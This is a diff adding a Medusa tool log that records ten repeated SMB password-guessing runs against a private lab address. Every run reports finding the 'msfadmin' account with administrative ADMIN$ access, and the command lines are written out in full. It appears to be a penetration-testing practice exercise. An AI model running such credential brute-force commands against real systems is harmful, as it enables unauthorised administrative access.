@@ -1,0 +1,40 @@
+# Medusa v.2.3 (2026-03-02 01:45:11)
+# medusa -h 192.168.56.101 -U usuarios.txt -p msfadmin -M smbnt -v 4 -O log_smb.txt 
+2026-03-02 01:45:11 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-03-02 01:45:12).
+# Medusa v.2.3 (2026-03-02 01:48:30)
+# medusa -h 192.168.56.101 -U usuarios.txt -p msfadmin -M smbnt -v 4 -F -O log_smb.txt 
+2026-03-02 01:48:31 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-03-02 01:48:31).
+# Medusa v.2.3 (2026-03-02 01:57:52)
+# medusa -h 192.168.56.101 -U usuarios.txt -p msfadmin -M smbnt -v 4 -F -O log_smb.txt 
+2026-03-02 01:57:53 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-03-02 01:57:53).
+# Medusa v.2.3 (2026-03-02 07:22:27)
+# medusa -h 192.168.56.101 -U usuarios.txt -p msfadmin -M smbnt -v 4 -F -O log_smb.txt 
+2026-03-02 07:22:27 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-03-02 07:22:27).
+# Medusa v.2.3 (2026-03-02 07:50:49)
+# medusa -h 192.168.56.101 -U usuarios.txt -p msfadmin -M smbnt -v 4 -F -O log_smb.txt 
+2026-03-02 07:50:50 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-03-02 07:50:50).
+# Medusa v.2.3 (2026-03-02 07:59:19)
+# medusa -h 192.168.56.101 -U usuarios.txt -p msfadmin -M smbnt -v 4 -F -O log_smb.txt 
+2026-03-02 07:59:19 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-03-02 07:59:19).
+# Medusa v.2.3 (2026-03-02 08:04:20)
+# medusa -h 192.168.56.101 -U usuarios.txt -p msfadmin -M smbnt -v 4 -F -O log_smb.txt 
+2026-03-02 08:04:20 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-03-02 08:04:20).
+# Medusa v.2.3 (2026-03-02 08:10:11)
+# medusa -h 192.168.56.101 -U usuarios.txt -p msfadmin -M smbnt -v 4 -F -O log_smb.txt 
+2026-03-02 08:10:11 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-03-02 08:10:11).
+# Medusa v.2.3 (2026-03-02 08:15:56)
+# medusa -h 192.168.56.101 -U usuarios.txt -p msfadmin -M smbnt -v 4 -F -O log_smb.txt 
+2026-03-02 08:15:56 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-03-02 08:15:56).
+# Medusa v.2.3 (2026-03-02 08:27:12)
+# medusa -h 192.168.56.101 -U usuarios.txt -p msfadmin -M smbnt -v 4 -O log_smb.txt 
+2026-03-02 08:27:13 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-03-02 08:27:14).
